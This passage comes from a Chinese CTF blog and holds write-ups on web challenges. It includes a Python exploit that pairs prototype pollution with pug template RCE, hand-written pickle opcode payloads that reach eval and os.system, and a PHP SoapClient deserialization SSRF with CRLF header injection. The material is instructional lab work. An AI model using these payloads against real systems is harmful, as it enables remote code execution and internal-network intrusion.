class="hljs-string">&quot;notadmin&quot;</span>) &#123;<br><br>      <span class="hljs-keyword">if</span> (req.session.debug !== <span class="hljs-literal">undefined</span> &amp;&amp; req.session.debug !== <span class="hljs-literal">false</span>) info.pretty = req.query.p;<br>      <span class="hljs-keyword">if</span> (req.query.diy !== <span class="hljs-literal">undefined</span>) req.session.diy = req.query.diy;<br>      info.diy = req.session.diy ? req.session.diy: <span class="hljs-string">&quot;尊贵的admin&quot;</span>;<br>      <span class="hljs-keyword">return</span> res.render(<span class="hljs-string">&#x27;admin&#x27;</span>, info);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">return</span> res.render(<span class="hljs-string">&#x27;admin&#x27;</span>, info);<br>    &#125;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">return</span> res.render(<span class="hljs-string">&#x27;msg&#x27;</span>, &#123;<span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-attr">msg</span>: <span class="hljs-string">&#x27;plz login first&#x27;</span>&#125;);<br>  &#125;<br>&#125;);<br></code></pre></div></td></tr></table></figure><p>这个地方就是可以读取源码的漏洞原因。</p><p><img src="https://img-blog.csdnimg.cn/068344140be04497ad8f415f499b424d.png" alt="在这里插入图片描述"></p><p>往下看，判断<code>req.session.isadmin !== &quot;notadmin&quot;</code>，然后的判断是关键。这里需要将<code>req.session.debug</code>污染成空值或其他的满足条件的来绕过，然后就可以利用<code>pug</code>的RCE来执行命令。</p><p><img src="https://img-blog.csdnimg.cn/9cc5405b335c4fdfac77ae4691fa660b.png" alt="在这里插入图片描述"></p><p>这里需要注意的是参考文章里面的<code>payload</code>中存在转义号，这是因为那个里面用了<code>json</code>解析，则要用转义号转移引号，这里则不需要。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url=<span class="hljs-string">&quot;http://localhost:5000/&quot;</span><br>session=requests.session()<br>session.post(url+<span class="hljs-string">&#x27;login&#x27;</span>,data=&#123;<br>    <span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">26</span>,<br>    <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">26</span><br>&#125;)<br>payload=&#123;<span class="hljs-string">&#x27;&quot;].__proto__[&quot;isadmin&#x27;</span>: <span class="hljs-string">&#x27;123&#x27;</span>,<br><span class="hljs-string">&#x27;&quot;].__proto__[&quot;debug&#x27;</span>: <span class="hljs-string">&#x27;123&#x27;</span>&#125;<br>r=session.get(url+<span class="hljs-string">&#x27;admin&#x27;</span>,params=&#123;<br>    <span class="hljs-string">&quot;p&quot;</span>:<span class="hljs-string">&quot;&#x27;);return process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;tac /root/flag.txt&#x27;);_=(&#x27;&quot;</span><br>&#125;,data=payload)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></div></td></tr></table></figure><p>中间很多自己node搭环境调试的过程就懒得贴了，总结一下编程代码功底还是最基础的东西呀！！！</p><h2 id="opcode"><a href="#opcode" class="headerlink" title="opcode"></a>opcode</h2><p>考的是<code>pickle</code>的知识</p><p>参考：<a href="https://www.freebuf.com/articles/web/264363.html">https://www.freebuf.com/articles/web/264363.html</a></p><p>​            <a href="https://zhuanlan.zhihu.com/p/361349643">https://zhuanlan.zhihu.com/p/361349643</a></p><p><code>pickle.dumps</code>将对象反序列化为字符串，<code>pickle.dump</code>将反序列化后的字符串存储为文件。</p><p><code>pickle.loads() </code>对象反序列化 <code>pickle.load()</code> 对象反序列化，从文件中读取数据。</p><p>看一下源码</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> render_template<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> session<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> builtins<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RestrictedUnpickler</span>(<span class="hljs-params">pickle.Unpickler</span>):</span><br>    blacklist = &#123;<span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;execfile&#x27;</span>, <span class="hljs-string">&#x27;compile&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>, <span class="hljs-string">&#x27;input&#x27;</span>, <span class="hljs-string">&#x27;__import__&#x27;</span>, <span class="hljs-string">&#x27;exit&#x27;</span>, <span class="hljs-string">&#x27;map&#x27;</span>&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">find_class</span>(<span class="hljs-params">self, module, name</span>):</span><br>        <span class="hljs-keyword">if</span> module == <span class="hljs-string">&quot;builtins&quot;</span> <span class="hljs-keyword">and</span> name <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.blacklist:<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(builtins, name)<br>        <span class="hljs-keyword">raise</span> pickle.UnpicklingError(<span class="hljs-string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">loads</span>(<span class="hljs-params">data</span>):</span><br>    <span class="hljs-keyword">return</span> RestrictedUnpickler(io.BytesIO(data)).load()<br><br><br>app = Flask(__name__)<br><br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-string">&quot;y0u-wi11_neuer_kn0vv-!@#se%32&quot;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/admin&#x27;</span>, methods = [<span class="hljs-string">&quot;POST&quot;</span>,<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">admin</span>():</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(session[<span class="hljs-string">&#x27;username&#x27;</span>])!= <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">str</span>(session[<span class="hljs-string">&#x27;username&#x27;</span>] , encoding = <span class="hljs-string">&quot;utf-8&quot;</span>)!= <span class="hljs-string">&#x27;admin&#x27;</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;not admin&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        data = base64.b64decode(session[<span class="hljs-string">&#x27;data&#x27;</span>])<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;R&quot;</span> <span class="hljs-keyword">in</span> data.decode():<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;nonono&quot;</span><br>        pickle.loads(data)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success&quot;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods = [<span class="hljs-string">&quot;GET&quot;</span>,<span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span>():</span><br>    username = request.form.get(<span class="hljs-string">&#x27;username&#x27;</span>)<br>    password = request.form.get(<span class="hljs-string">&#x27;password&#x27;</span>)<br>    imagePath = request.form.get(<span class="hljs-string">&#x27;imagePath&#x27;</span>)<br>    session[<span class="hljs-string">&#x27;username&#x27;</span>] = username + password<br>    session[<span class="hljs-string">&#x27;data&#x27;</span>] = base64.b64encode(pickle.dumps(<span class="hljs-string">&#x27;hello&#x27;</span> + username, protocol=<span class="hljs-number">0</span>))<br>    <span class="hljs-keyword">try</span>:<br>        f = <span class="hljs-built_in">open</span>(imagePath,<span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;static/image/error.png&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>    imageBase64 = base64.b64encode(f)<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;login.html&quot;</span>, username = username, password = password, data = <span class="hljs-built_in">bytes</span>.decode(imageBase64))<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods = [<span class="hljs-string">&quot;GET&quot;</span>,<span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-string">&#x27;8888&#x27;</span>)<br></code></pre></div></td></tr></table></figure><p>这题的代码和一些题目的重复度较高，借鉴了Code-Breaking2018 picklecode，再套了一个XCTF抗疫赛 webtmp的opcode。限制了必须是builtins模块和一个黑名单过滤然后多过滤了一个’R’操作符，但是仔细看可以发现，根本没有用到自己定义的loads方法，直接使用了<code>pickle,.loads()</code>相当于根本没有过滤，从这样看的话就直接随便构造了直接弹shell都可以了，下面按照题目的预期解来看一下。</p><p>其实拿<code>Code-Breaking</code>的payload改一下即可，用o操作符来替换R操作符即可，原payload</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">cbuiltins<br><span class="hljs-built_in">getattr</span><br>p0<br>(cbuiltins<br><span class="hljs-built_in">dict</span><br>S<span class="hljs-string">&#x27;get&#x27;</span><br>tRp1<br>cbuiltins<br><span class="hljs-built_in">globals</span><br>)Rp2<br>00g1<br>(g2<br>S<span class="hljs-string">&#x27;builtins&#x27;</span><br>tRp3<br>0g0<br>(g3<br>S<span class="hljs-string">&#x27;eval&#x27;</span><br>tR(S<span class="hljs-string">&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;</span><br>tR.<br></code></pre></div></td></tr></table></figure><p>对比一下几个操作符的区别。</p><table><thead><tr><th>R</th><th>选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</th><th>R</th><th>函数和参数出栈，函数的返回值入栈</th><th>无</th></tr></thead><tbody><tr><td>o</td><td>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td><td>o</td><td>这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td><td>无</td></tr></tbody></table><table><thead><tr><th>i</th><th>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</th><th>i[module]\n[callable]\n</th><th>这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</th><th>无</th></tr></thead><tbody><tr><td>0</td><td>丢弃栈顶对象</td><td>0</td><td>栈顶对象被丢弃</td><td>无</td></tr></tbody></table><p>这里可以看出来，将R改成o需要将MARK的位置修改到要执行的函数前，并且还要去掉t操作符，0操作符其实可要可不要，加上的话逻辑更清晰<br>修改后payload</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">(cbuiltins<br><span class="hljs-built_in">getattr</span><br>p0<br>cbuiltins<br><span class="hljs-built_in">dict</span><br>S<span class="hljs-string">&#x27;get&#x27;</span><br>op1<br>(cbuiltins<br>gloabals<br>op2<br>S<span class="hljs-string">&#x27;__builtins__&#x27;</span>  <span class="hljs-comment">#这里不是&#x27;builtins&#x27;否则的话无法引入builtins模块</span><br>op3<br>(g0<br>g3<br>S<span class="hljs-string">&#x27;eval&#x27;</span><br>op4<br>(g4<br>S<span class="hljs-string">&#x27;__import__(&quot;os&quot;).system(&quot;dit&quot;)&#x27;</span><br>o.<br></code></pre></div></td></tr></table></figure><p>测试了一下，有时候windows上的payload也不一定能在linux上运行。</p><p><img src="https://img-blog.csdnimg.cn/3a0c88d98a2f434fab4ee0cee00102a9.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="what-pickle"><a href="#what-pickle" class="headerlink" title="what pickle"></a>what pickle</h2><p>和前面的题目有些类似了，也是先读源码，考的也是pickle，看看wp就行吧。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于反序列化中原生类的利用</title>
    <link href="/2021/08/02/2021-8-1-%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2021/08/02/2021-8-1-%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="关于反序列化中原生类的利用"><a href="#关于反序列化中原生类的利用" class="headerlink" title="关于反序列化中原生类的利用"></a>关于反序列化中原生类的利用</h1><p>配置环境,修改php.ini</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">得添加extension=php_soap.dll (加载soap 内置包)<br><br>修改soap.wsdl_cache_enabled=<span class="hljs-number">1</span> 改为soap.wsdl_cache_enabled=<span class="hljs-number">0</span> 这个是soap的缓存，测试的时候最好改为<span class="hljs-number">0</span>，上线稳定了改为<span class="hljs-number">1</span><br><br>soap有两种模式一种是wsdl,一种是no-wsdl<br></code></pre></div></td></tr></table></figure><p>关于soap用法 ，可参考<a href="https://www.jb51.net/article/153394.htm">https://www.jb51.net/article/153394.htm</a></p><p>SoapClient用于调用远程服务器上的SoapServer页面，并实现了对相应函数的调用。</p><p>可以先看一下原生类方法</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$classes</span> = get_declared_classes();<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$classes</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$class</span>) &#123;<br>    <span class="hljs-variable">$methods</span> = get_class_methods(<span class="hljs-variable">$class</span>);<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$methods</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$method</span>) &#123;<br>        <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$method</span>, <span class="hljs-keyword">array</span>(<br>            <span class="hljs-string">&#x27;__destruct&#x27;</span>,<br>            <span class="hljs-string">&#x27;__toString&#x27;</span>,<br>            <span class="hljs-string">&#x27;__wakeup&#x27;</span>,<br>            <span class="hljs-string">&#x27;__call&#x27;</span>,<br>            <span class="hljs-string">&#x27;__callStatic&#x27;</span>,<br>            <span class="hljs-string">&#x27;__get&#x27;</span>,<br>            <span class="hljs-string">&#x27;__set&#x27;</span>,<br>            <span class="hljs-string">&#x27;__isset&#x27;</span>,<br>            <span class="hljs-string">&#x27;__unset&#x27;</span>,<br>            <span class="hljs-string">&#x27;__invoke&#x27;</span>,<br>            <span class="hljs-string">&#x27;__set_state&#x27;</span><br>        ))) &#123;<br>            <span class="hljs-keyword">print</span> <span class="hljs-variable">$class</span> . <span class="hljs-string">&#x27;::&#x27;</span> . <span class="hljs-variable">$method</span> . <span class="hljs-string">&quot;\n&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125; <br></code></pre></div></td></tr></table></figure><p>关于soapclient有</p><figure class="highlight avrasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs avrasm"><span class="hljs-symbol">SoapClient:</span>:__<span class="hljs-keyword">call</span><br><span class="hljs-symbol">SoapFault:</span>:__toString<br><span class="hljs-symbol">SoapFault:</span>:__wakeup<br></code></pre></div></td></tr></table></figure><p>对于<strong>soapclient</strong>的实例有两种:</p><p>一种是通过wsdl文件，wsdl文件可以放在本地，也可以是通过远程引用，但我还没太了解这个。</p><p><code>$soap = new SoapClient(&quot;file.wsdl&quot;);</code></p><p>另一种不提供wsdl文件。如下当然只是简单的对象生成，还可以有很多参数，可以通过数组继续增加，还可以有<code>user_agent</code></p><p><code>$soap = new SoapClient(null,array(&quot;location&quot;=&gt;&quot;服务地址&quot;,&quot;uri&quot;=&gt;&quot;命名空间&quot;));</code></p><p>这个原生类的主要作用就在于触发它的<code>__call</code>方法来导致SSRF打内网的效果。先简单看网上的几个样例。</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> SoapClient(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;uri&#x27;</span>=&gt;<span class="hljs-string">&#x27;bbb&#x27;</span>, <span class="hljs-string">&#x27;location&#x27;</span>=&gt;<span class="hljs-string">&#x27;http://127.0.0.1:5555/path&#x27;</span>));<br><span class="hljs-variable">$b</span> = serialize(<span class="hljs-variable">$a</span>); <br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$c</span> = unserialize(<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$c</span>-&gt;not_exists_function();<br></code></pre></div></td></tr></table></figure><p>然后在本机上监听一下，但是很疑惑的是<code>call</code>方法到底是怎么实现的，看了很多文章都没介绍为啥，正常将call方法第一个传参的是调用的方法名，后面是参数，这个竟然能请求到自己设置的服务地址，大受震撼。这里简单调试了一下大概能懂一点。</p><p>实例化一个soapclient内容如下，还有后面两个参数。<br><img src="https://img-blog.csdnimg.cn/a73a9b8fcdb648b7b2293536cafd3a37.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>查看了一下文档和<code>SoapClient-&gt;__doRequest</code>方法有关</p><p><img src="https://img-blog.csdnimg.cn/cb545f31b3b84873ae1a337d02b03a37.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>这个会向服务地址发起请求，然后看了一下源码执行后的打印结果。</p><p><img src="https://img-blog.csdnimg.cn/b005026ce0994500a58e1c4372925c43.png" alt="在这里插入图片描述"></p><p>这里<code>SoapClient-&gt;__doRequest</code>的第一个参数为xml格式内容，第二个应该就是请求地址，最后是<code>uri</code>和调用的不存在方法。<code>call</code>方法的实现应该会用到<code>SoapClient-&gt;__doRequest</code>但还是没太懂。</p><p><img src="https://img-blog.csdnimg.cn/c1c25c79cb89430f8b2bb3ab3d2d2be7.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>这里还存在clrf漏洞,可以伪造post请求。</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$target</span> = <span class="hljs-string">&quot;http://127.0.0.1:5555/&quot;</span>;<br><span class="hljs-variable">$post_string</span> = <span class="hljs-string">&#x27;data=abc&#x27;</span>;<br><span class="hljs-variable">$headers</span> = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,<br>    <span class="hljs-string">&#x27;Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93&#x27;</span><br>);<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> SoapClient(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span> =&gt; <span class="hljs-variable">$target</span>,<span class="hljs-string">&#x27;user_agent&#x27;</span>=&gt;<span class="hljs-string">&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.join(<span class="hljs-string">&#x27;^^&#x27;</span>,<span class="hljs-variable">$headers</span>).<span class="hljs-string">&#x27;^^Content-Length: &#x27;</span>. (<span class="hljs-keyword">string</span>)strlen(<span class="hljs-variable">$post_string</span>).<span class="hljs-string">&#x27;^^^^&#x27;</span>.<span class="hljs-variable">$post_string</span>,<span class="hljs-string">&#x27;uri&#x27;</span>=&gt;<span class="hljs-string">&#x27;hello&#x27;</span>));<br><span class="hljs-variable">$aaa</span> = serialize(<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$aaa</span> = str_replace(<span class="hljs-string">&#x27;^^&#x27;</span>,<span class="hljs-string">&quot;\n\r&quot;</span>,<span class="hljs-variable">$aaa</span>);<br><span class="hljs-keyword">echo</span> urlencode(<span class="hljs-variable">$aaa</span>);<br><span class="hljs-variable">$test</span> = unserialize(<span class="hljs-variable">$aaa</span>);<br><span class="hljs-variable">$test</span>-&gt;sdadasd();<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2ade19efff4343ce9f7696d731dbc675.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h1 id="MRCTF-Ezpop-Revenge"><a href="#MRCTF-Ezpop-Revenge" class="headerlink" title="MRCTF Ezpop_Revenge"></a>MRCTF Ezpop_Revenge</h1><p>题目是typecho1.2得反序列化，进入题目后没发现什么就经典扫一下目录，发现有<code>www.zip</code>泄露，拿到源码开始审计。</p><p>先看flag.php，这里看到需要本地访问，应该是要ssrf打<br><img src="https://img-blog.csdnimg.cn/5e975e9d78d448a8b21eb45f945ec42e.png" alt="在这里插入图片描述"></p><p>搜索一下<code>unserialize</code>发现入口，在<code>Plugin.php</code>过滤了很多rce函数。然后实例化得参数为数组里面得两个值。<br><img src="https://img-blog.csdnimg.cn/505c8db80de7404fad8be47662562abb.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/7ddc47cef7aa4724bec0d208e200cbff.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>跟进<code>Typecho_Db</code>实例化的过程，跟进后有很多代码，基本上是数据库查询得一些操作。构造函数这有一个字符串得连接，这里想到的可以利用<code>__toString</code>，再接着往下看。<br><img src="https://img-blog.csdnimg.cn/601489e2744b46009af248e7b725cebf.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>慢慢看发现一个<code>call_user_func</code>函数，突然觉得是不是利用这个，后来发现不可控，而且都暗示要SSRF了肯定是不能RCE命令执行的，放弃了。<br><img src="https://img-blog.csdnimg.cn/4723c2ea3cd1422ebbaac7470a3affb8.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>后面找到实例化sql对象。<br><img src="https://img-blog.csdnimg.cn/406a1f70027241d2bb223e471021defd.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>跟进能看到里面真有一<code>toString</code>函数<br><img src="https://img-blog.csdnimg.cn/7fde6098850643129e2b2ff94b0814c1.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>但到这就不知道怎么做了，看了wp才知道可以将<code>$this-&gt;_adapter</code>控制为<code>Soapclient</code>类触发<code>Soapclient</code>原生类的<code>__call</code>函数从而可以进行SSRF，可以看上面最开始写的这个原理。</p><p>捋一下思路：<br>最开始是反序列化触发__wakeup函数，实例化对象<code> $db = new 